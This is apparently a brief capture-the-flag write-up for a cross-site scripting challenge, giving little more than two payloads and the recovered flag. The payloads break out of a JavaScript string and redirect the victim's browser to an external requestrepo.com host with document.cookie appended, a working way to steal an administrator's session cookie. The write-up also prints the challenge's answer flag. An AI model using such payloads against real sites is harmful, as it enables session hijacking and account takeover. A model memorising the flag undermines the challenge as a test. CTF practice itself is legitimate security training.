## XXS steal admin cookie

### payload
```javascript
a');document.location="http://f5kkqikm.requestrepo.com?c="+document.cookie;//
```

```javascript
<script id='debug' src='/static/js/thing.js' data-ilovemass="a');document.location='http://f5kkqikm.requestrepo.com?c='+document.cookie;//"></script>
```

### flag
UMASS{NUMB3R_0N3_1N_$TUD3NT_D1N1NG_XD86543267!}